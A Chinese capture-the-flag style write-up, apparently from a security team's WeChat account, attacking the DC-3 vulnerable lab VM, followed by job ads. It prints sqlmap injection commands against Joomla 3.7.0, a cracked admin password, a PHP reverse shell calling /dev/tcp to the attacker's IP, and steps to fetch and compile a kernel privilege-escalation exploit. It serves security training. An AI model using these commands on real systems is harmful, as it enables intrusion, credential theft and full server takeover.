> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LUUVzLf3YUWA0L9uh-1ggA)

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**_**No.1  
**_**_

_**搭建测试靶机**_

下载地址：https://www.five86.com/dc-3.html  
则靶机 DC-4 ip：192.168.188.158（NAT 连接）  
攻击机 kalilinux ip：192.168.188.144

_**_**No.2  
**_**_

_**信息收集**_

用 netdiscover -r 192.168.188.0/24 扫描 ip，得到靶机 ip 192.168.188.158

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXolh1BibeJKzHgcHQHwXL3tnVWIb6FicCg7RtbciadW4iaHZmcLiaIfxkwhaw/640?wx_fmt=png)

先来端口扫描  
利用 nmap 对目标主机进行端口扫描，发现开放端口：80

```
使用命令：nmap -A -p- 192.168.188.158
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXo8HfL925nl9o62CQQANt8ICzUicOYPwVhO9GPnJDkL8WH5gJSzgWic0yg/640?wx_fmt=png)

目录扫描

```
dirb http://192.168.188.158
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoyCzmTv6MzRnEftcdic5gRHwWKT73fEQe5gZY3GJrvphvvO7VasktTSw/640?wx_fmt=png)

访问扫描的目录，发现有后台登陆页面

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoSmN8DqGW9vrQ0iafz0AR6KpgqPLPvpCDWaWdWQd1yd6VlLiaiaBfia8DNQ/640?wx_fmt=png)

查看 CMS 的版本

```
访问：http://192.168.188.158//language/en-GB/en-GB.xml
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXo5fDJAIPcLegOYZ72yd7wHg7ztic072hxZmCf4eboENoXyrBsaVL9zfQ/640?wx_fmt=png)

可以看到 cms 的版本为 Joomla 3.7.0  
Joomla 寻找漏洞，在 kali 下搜索：searchsploit joomla

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoAAP140U2PY9ghaRXSEaIv1UDhmKmfxTiaNb6QXcIUul7K9Vn8VtnkUA/640?wx_fmt=png)

此版本有 SQl 注入漏洞

_**_**No.3  
**_**_

_**漏洞利用**_

使用 sqlmap

```
sqlmap -u "http://192.168.188.158/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]# 爆表库
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoKNAD03KnN4d3P89ZqfhOVPfiaiaRtN3MGlaFKFFa0nEiaC2uFkTibEicpYg/640?wx_fmt=png)

```
sqlmap -u "http://192.168.188.158/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --dbms mysql -D joomladb --tables # 爆表
```

```
Database: joomladb
[76 tables]
+---------------------+
| # __assets           |
| # __associations     |
| # __banner_clients   |
| # __banner_tracks    |
| # __banners          |
| # __bsms_admin       |
| # __bsms_books       |
| # __bsms_comments    |
| # __bsms_locations   |
| # __bsms_mediafiles  |
| # __bsms_message_typ |
| # __bsms_podcast     |
| # __bsms_series      |
| # __bsms_servers     |
| # __bsms_studies     |
| # __bsms_studytopics |
| # __bsms_teachers    |
| # __bsms_templatecod |
| # __bsms_templates   |
| # __bsms_timeset     |
| # __bsms_topics      |
| # __bsms_update      |
| # __categories       |
| # __contact_details  |
| # __content_frontpag |
| # __content_rating   |
| # __content_types    |
| # __content          |
| # __contentitem_tag_ |
| # __core_log_searche |
| # __extensions       |
| # __fields_categorie |
| # __fields_groups    |
| # __fields_values    |
| # __fields           |
| # __finder_filters   |
| # __finder_links_ter |
| # __finder_links     |
| # __finder_taxonomy_ |
| # __finder_taxonomy  |
| # __finder_terms_com |
| # __finder_terms     |
| # __finder_tokens_ag |
| # __finder_tokens    |
| # __finder_types     |
| # __jbsbackup_timese |
| # __jbspodcast_times |
| # __languages        |
| # __menu_types       |
| # __menu             |
| # __messages_cfg     |
| # __messages         |
| # __modules_menu     |
| # __modules          |
| # __newsfeeds        |
| # __overrider        |
| # __postinstall_mess |
| # __redirect_links   |
| # __schemas          |
| # __session          |
| # __tags             |
| # __template_styles  |
| # __ucm_base         |
| # __ucm_content      |
| # __ucm_history      |
| # __update_sites_ext |
| # __update_sites     |
| # __updates          |
| # __user_keys        |
| # __user_notes       |
| # __user_profiles    |
| # __user_usergroup_m |
| # __usergroups       |
| # __users            |
| # __utf8_conversion  |
| # __viewlevels       |
+---------------------+
```

找到了名为# __users 表，其中保存了用户名和密码信息；

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoibjBQ8YMhTxY2poH2KhJx6P8rQpryNMTUBa0hkCuicYMRrzFLUvicclRg/640?wx_fmt=png)

```
sqlmap -u "http://192.168.188.158/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --dbms mysql -D joomladb -T '# __users' --columns # 爆列
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXodFZXhLicsv2hUBTXFue6WEMBbBgx840Lk9EdoEDiaTEsuTvBNGZB3N3A/640?wx_fmt=png)

```
sqlmap -u "http://192.168.188.158/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --dbms mysql -D joomladb -T '# __users' -C id,name,password,username --dump# 爆字段
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoB5ja61B3z2kKhkLcpCiaKXFHRKKd7o6KYLOOC5mYQI0VgLa1M5SdNWw/640?wx_fmt=png)

```
用户名：admin
密码：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```

利用 johnny 暴力破解，得到了明文密码为 snoopy

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXo2BRf0quaNFOd7Ujr2O78nGbkUuliaYP8NLNNvg03Y2tvx8h2psfyahw/640?wx_fmt=png)

_**_**No.4  
**_**_

_**进行提权**_

进入网站后台管理主页面（http://192.168.188.158/administrator/index.php），具体操作如下：  
点击页面右侧的 “Templates” ——> 再点击 “ Templates ” ——> 点击 “ Beez3 Details and Files ” ——> 点击 “ index.php ”，进入网页源码。  
其中登录后台管理的用户名和密码如下：  
用户名：admin  
密码：snoopy

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoUBeHQKlYgTk0A7Y3Ze9F6ACEgqQKQ7dPlcNbC9j4rYrgeqJmL53q9A/640?wx_fmt=png)

在这里找到可编辑的 php 文件，可以插入恶意代码，进行反弹 shell。  
在管理页面的 index.php 中写入反弹 shell 代码，并按 Save 进行保存  
用 system() 执行 bash -c 的编码如下：

```
<?php
system("bash -c 'bash -i >& /dev/tcp/192.168.188.144/8080 0>&1' ");
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoFmoYhpsPpF8GSKYLGicDv2NfaGqicwbrvCj4dsEiadshWUjM30J9nZIhg/640?wx_fmt=png)

在 kali 中输入写入 nc 命令，进行监听；

```
命令：root@kali:~# nc -lvvp 8080
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoyvZDd9ohZXkSET05bQTGrncuibtyn3eibARwFLqW6gtBp3lL3z2Zia31Q/640?wx_fmt=png)

进行触发这个反弹 shell（访问 DC-3 的默认主页）

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoBzUDSdPPJK7GgRf3tffpgU72v80mdnmh8vmsYQwxPia6xMSBMS3rMug/640?wx_fmt=png)

这时候将在 kali 上得到，反弹的 getshell

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXowNZ8F5mphFrfIdja4wvWulNSFW4yGO0GoGbpL8YDxF7fKdCzePUbEg/640?wx_fmt=png)

获取目标主机的操作系统版本，以及该 getshell 的 ID 号

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoxdfmEsBSkgGQ3GZlbzibMBJ0uQ8pB4TAAkvIUnNiazficSg9BxETy5NRw/640?wx_fmt=png)

对应版本为 Ubuntu 16.04，用 searchsploit 搜索可以利用的漏洞  
root@kalilinux:~# searchsploit Ubuntu 16.04

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXo0sZDVAicAVHANOXOHgBSzyIcStG6LJtRmiburx0CU7b0ByialNmNxNkibg/640?wx_fmt=png)

搭建一个 Ubuntu16.04 的环境测试后使用 39772 进行提权  
先通过 kali 下载 github 的 39772 文件  
打开 39772 这个文件，可以看到 39772 文件的下载路径；  
路径为：https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoQoiciaKH775ZPoj2K8sfejHibVaYsYhHKFkZNZh9IGQxNzDoPfQOgVRjw/640?wx_fmt=png)

由于得到 DC-3 靶机的 shell 内无法下载 github 的 39772 文件；

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXom6EHNWMnWC3u3wPLWRriaEiccIJicmCpuiciaIgE12kvRBLzozaNLaRBwpQ/640?wx_fmt=png)

使用 kali 进行下载

```
root@kalilinux:~# wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
root@kalilinux:~# unzip 39772
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoHRmAriasGa1gzd88VY7gu1K9YEbsNkJ338PWeGzxU3SYkJ91piayDJnA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoPs5THribHxhweByIuqWibU6rC6OTMm37ntFCoIpoickyMy2QTJDQNHYSQ/640?wx_fmt=png)

kali 中当前路径开启 python.server，供 DC-3 下载 python -m SimpleHTTPServer 9999

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXof96IJYicVJdTib2MqLibgfZyrX4XhzprWKDlQXNnU8evia5HUBaiae73ibAw/640?wx_fmt=png)

用 python 开启简单的服务器后，在以获得的 DC-3 的 getshell 下载 39772 文件；

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXolwuvR39AaANHM9FRpMRmJ8U0TrUic74Q86uFvHXezRVsjYicg4ebsaXA/640?wx_fmt=png)

进行提权操作  
解压 exploit.tar 文件；  
命令：tar -xvf exploit.tar

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoSk7w2FEL6B4TYCuPHvV0Aoexv4C2LD9FzpX9BibLm2EnGh3spc5BWZg/640?wx_fmt=png)

编译脚本  
命令：

```
chmod +x compile.sh
./compile.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXojXJlRibZ1khMfNwySToKlEzPRr5WRJuR0e4SvmFbAiaDUjwB0rb8wnGA/640?wx_fmt=png)

执行提权脚本

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXoubOQrCIQdosZRUz8bUiarwwRS9vuKsDkvRoNElu3cncLcw9OMYn4viaA/640?wx_fmt=png)

提权成功

_**招聘启事**_

安恒雷神众测 SRC 运营（实习生）  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至

bountyteam@dbappsecurity.com.cn

安全招聘  
————————  
公司：安恒信息  
岗位：Web 安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

岗位：红队武器化 Golang 开发工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至

bountyteam@dbappsecurity.com.cn

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JXXKsXxMbqZOslP8VFKhyXocGnIOQfBgbRyG78ibbDxGjkkeABQMS24TYxy2P8tIcYwsmGPUDiajBiaA/640?wx_fmt=jpeg)

专注渗透测试技术

全球最新网络攻击技术

END

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWNJUk7b6deYToSVKRcmciaf9MqsrGSZyulpsgdh2tUhwy3JM8qRV0ypwAaN8MibId78oTXvyuV0F9Q/640?wx_fmt=jpeg)